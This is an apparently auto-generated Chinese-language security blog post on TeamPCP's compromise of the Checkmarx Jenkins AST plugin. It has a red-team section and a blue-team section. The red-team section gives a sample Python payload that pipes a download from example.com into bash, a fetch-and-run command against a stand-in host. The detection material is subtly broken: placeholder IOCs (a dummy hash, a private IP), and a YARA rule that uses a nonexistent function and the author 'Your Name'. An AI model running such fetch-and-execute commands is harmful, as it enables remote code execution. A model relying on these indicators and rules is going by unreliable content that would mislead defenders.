---
layout: post
title:  "TeamPCP Compromises Checkmarx Jenkins AST Plugin Weeks After KICS Supply Chain Attack"
date:   2026-05-11 19:29:37 +0000
categories: [security]
severity: critical
---

# 🚨 解析 TeamPCP 對 Checkmarx Jenkins AST Plugin 的利用：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Plugin Hijacking`, `Supply Chain Attack`, `GitHub Repository Compromise`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: TeamPCP 利用了 Checkmarx Jenkins AST Plugin 的版本管理機制，發佈了一個修改過的 Plugin 版本到 Jenkins Marketplace，從而實現了對受影響系統的遠程代碼執行。
* **攻擊流程圖解**: 
    1. TeamPCP 獲得了 Checkmarx Jenkins AST Plugin 的 GitHub Repository 的存取權。
    2. TeamPCP 修改了 Plugin 的代碼，加入了惡意功能。
    3. TeamPCP 發佈了修改過的 Plugin 版本到 Jenkins Marketplace。
    4. 受影響的系統下載並安裝了修改過的 Plugin 版本。
    5. TeamPCP 利用 Plugin 的惡意功能實現了遠程代碼執行。
* **受影響元件**: Checkmarx Jenkins AST Plugin 版本 2.0.13-829.vc72453fa_1c16 或之前的版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: TeamPCP 需要獲得 Checkmarx Jenkins AST Plugin 的 GitHub Repository 的存取權。
* **Payload 建構邏輯**:

    ```
    
    python
    # 範例 Payload
    import os
    import subprocess
    
    def execute_command(command):
        subprocess.Popen(command, shell=True)
    
    # 惡意功能
    execute_command("curl -s https://example.com/malicious_payload | bash")
    
    ```
    * **範例指令**: `curl -s https://example.com/malicious_payload | bash`
* **繞過技術**: TeamPCP 可能使用了 GitHub Repository 的存取權來繞過安全檢查。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /tmp/malicious_payload |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Checkmarx_Jenkins_AST_Plugin_Malicious_Payload {
        meta:
            description = "Detects malicious payload in Checkmarx Jenkins AST Plugin"
            author = "Your Name"
        strings:
            $payload = "curl -s https://example.com/malicious_payload | bash"
        condition:
            $payload in (file_contents(0, 0))
    }
    
    ```
    * **SIEM 查詢語法 (Splunk/Elastic)**: `index=security sourcetype=plugin_logs "curl -s https://example.com/malicious_payload | bash"`
* **緩解措施**: 
    1. 更新 Checkmarx Jenkins AST Plugin 到最新版本。
    2. 監控 GitHub Repository 的存取權。
    3. 啟用安全檢查機制。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Plugin Hijacking**: 想像一個 Plugin 像是一個可擴充的模組，當惡意人員控制了這個模組時，就可以實現惡意功能。技術上是指惡意人員修改或替換了 Plugin 的代碼，從而實現了惡意功能。
* **Supply Chain Attack**: 想像一個供應鏈像是一個長長的鏈條，當惡意人員控制了鏈條中的某一環節時，就可以實現惡意功能。技術上是指惡意人員攻擊了供應鏈中的某一環節，從而實現了惡意功能。
* **GitHub Repository Compromise**: 想像一個 GitHub Repository 像是一個代碼倉庫，當惡意人員控制了這個倉庫時，就可以實現惡意功能。技術上是指惡意人員獲得了 GitHub Repository 的存取權，從而實現了惡意功能。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/05/teampcp-compromises-checkmarx-jenkins.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


